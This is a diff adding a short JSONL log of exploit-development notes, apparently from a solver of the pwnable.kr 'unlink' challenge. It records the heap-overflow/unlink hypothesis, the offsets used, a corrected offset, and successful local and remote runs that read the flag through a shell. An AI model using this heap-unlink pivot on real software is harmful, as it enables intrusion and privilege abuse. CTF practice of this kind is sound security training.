@@ -1,0 +1,11 @@
+{"t": "hypothesis", "text": "A->buf overflow overwrites B->fd/B->bk; program unlink(B) writes saved_ecx to heap pivot so main epilogue returns through shell() stored in A->buf", "ts": 1784126868}
+{"t": "offset", "k": "shell", "v": "0x080491d6", "src": "nm", "ts": 1784126868}
+{"t": "offset", "k": "saved_ecx_from_stack_leak", "v": "+0xc", "src": "main epilogue: &A=ebp-0x14, saved ecx=ebp-0x8", "ts": 1784126868}
+{"t": "offset", "k": "b_fd_from_A_buf", "v": "0x10", "src": "OBJ layout/malloc spacing", "ts": 1784126868}
+{"t": "offset", "k": "b_bk_from_A_buf", "v": "0x14", "src": "OBJ layout/malloc spacing", "ts": 1784126868}
+{"t": "no", "text": "B->fd offset 0x10", "reason": "local process did not alter control flow; malloc(16) user pointers are 0x20 apart on tested i386 glibc", "ts": 1784126964}
+{"t": "offset", "k": "b_fd_from_A_buf", "v": "0x18", "src": "local process SIGSEGV/control test", "ts": 1784126964}
+{"t": "offset", "k": "b_bk_from_A_buf", "v": "0x1c", "src": "local process SIGSEGV/control test", "ts": 1784126964}
+{"t": "primitive", "name": "heap_unlink_stack_pivot", "status": "pass", "evidence": "local normal run: stack leak &A, heap leak A; payload writes saved_ecx=&A+0xc to heap+0x10; epilogue ret consumes shell at heap+0x0c; observed echo PWNED and id output", "ts": 1784126964}
+{"t": "primitive", "name": "heap_unlink_stack_pivot", "status": "pass", "evidence": "remote-equivalent ssh unlink@pwnable.kr:2222: stack leak &A=0xffbc1544 heap leak A=0x9c489b0; cat /home/unlink/flag succeeded", "ts": 1784126982}
+{"t": "ok", "text": "flag read from remote shell via setgid unlink_pwn shell; no auto-submit", "ts": 1784126982}
